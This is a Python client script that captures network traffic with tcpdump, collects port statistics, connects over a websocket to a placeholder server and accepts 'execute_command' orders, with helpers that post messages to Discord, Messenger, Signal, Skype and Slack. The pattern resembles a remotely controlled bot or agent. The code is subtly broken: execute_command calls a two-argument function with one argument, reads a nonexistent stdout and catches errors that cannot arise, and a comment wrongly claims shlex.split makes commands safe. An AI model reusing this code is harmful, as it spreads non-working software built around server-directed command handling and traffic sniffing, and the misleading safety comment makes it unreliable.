import asyncio
import websockets
import json
import uuid
import subprocess
import shlex
from client.commands.discord import send_discord_message
from client.commands.messenger import send_messenger_message
from client.commands.signal import send_signal_message
from client.commands.skype import send_skype_message
from client.commands.slack import send_slack_message
from client.collectors.tcp.dump import TcpDumpManager, run_tcpdump
from client.collectors.ports.collect import NetworkStatsCollector

async def connect_to_server(device_id, port_collector, tcpdump_manager):
    try:
        # Start the collectors
        port_collector.start()
        tcpdump_manager.run_tcpdump()
        
        uri = f"ws://<server-ip>:5000?device_id={device_id}"
        async with websockets.connect(uri) as websocket:
            await websocket.send(json.dumps({"status": "ready"}))

            while True:
                message = await websocket.recv()
                data = json.loads(message)

                if data['type'] == 'execute_command':
                    command_id = data['command_id']
                    command = data['command']
                    result = await execute_command(command)
                    await websocket.send(json.dumps({
                        "device_id": device_id,
                        "command_id": command_id,
                        "result": result
                    }))
    except websockets.exceptions.ConnectionClosed:
        print("WebSocket connection closed, stopping collectors.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    finally:
        # Ensure collectors are stopped when connection closes or an error occurs
        stop_collectors(port_collector, tcpdump_manager)

async def execute_command(command):
    """
    Execute a shell command and return the result.
    """
    try:
        # Ensure the command is safe to execute
        sanitized_command = shlex.split(command)
        result = post_message_to_the_chat(sanitized_command)
        return {"status": "success", "output": result.stdout}
    except subprocess.CalledProcessError as e:
        return {"status": "failure", "error": str(e), "output": e.stderr}

def post_message_to_the_chat(message, platform, executed=False):
    """ Sends a message to the specified platform's chat. """
    if platform == 'discord':
        return send_discord_message(message, executed)
    elif platform == 'messenger':
        return send_messenger_message(message, executed)
    elif platform == 'signal':
        return send_signal_message(message, executed)
    elif platform == 'skype':
        return send_skype_message(message, executed)
    elif platform == 'slack':
        return send_slack_message(message, executed)
    else:
        print("Unsupported platform")

def stop_collectors(port_collector, tcpdump_manager):
    """ Stop the network statistics collector and tcpdump manager. """
    port_collector.stop()  # Stops the NetworkStatsCollector
    tcpdump_manager.stop_tcpdump()  # Stops the TcpDumpManager

if __name__ == "__main__":
    print("Starting client")
    device_id = str(uuid.uuid4())
    port_collector = NetworkStatsCollector()
    tcpdump_manager = TcpDumpManager()
    asyncio.run(connect_to_server(device_id, port_collector, tcpdump_manager))
